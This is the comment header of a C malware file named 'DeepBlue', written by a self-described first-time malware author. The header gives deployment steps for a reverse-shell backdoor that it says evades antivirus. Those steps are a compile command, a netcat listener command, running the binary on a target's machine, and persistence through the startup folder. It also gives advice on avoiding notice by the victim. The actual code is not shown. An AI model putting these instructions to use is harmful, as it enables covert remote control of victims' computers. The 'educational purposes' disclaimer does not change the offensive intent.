#TCP connection #ReverseShell #BackDoor
//Name: DeepBlue
//Author: Alex H.
//Date: 25.12.2025
//This is first time creating an actual malware. Its undetactable by most antiviruses and creates a reverse shell to a specified IP and port.
// It also copies itself to the startup folder to maintain persistence.You can also execute commands remotely.
// Use this for educational purposes only and i do not take any responsibility for any damage couse by this code.
//please dont use it for illegal activities. and if u want to test it always get permission first! thanks you ;]

//1. You should change the <YOUR_IP_ADDRESS> and <YOUR_PORT> to your own IP address and port where you want to receive the reverse shell connection.
//2. Compile the code using a C compiller that supports this code. ( gcc malicios.c -o DeepBlue.exe -mwindows -lws2_32 -lshell32 -lole32 -luuid )
//3. Run NC listener on your port ( nc -nvlp <YOUR_PORT> ) make sure this port isnt used by any other application. i would reccomend using a high port number like 50003.
//4. Execute the compiled malware on the target machine. You should see a connection established on your NC listener, congratulations you madea connections, now you can execute commands remotely!
// You can type "q" to quit the connection, this is also gonna stop the app on victims machine.
// when he reboots the machine the malware is gonna start agian because its coppied to startup folder.
// But be aware most users that are a little techy are gonna notice a new application in their startup folder so use it wisely ;]
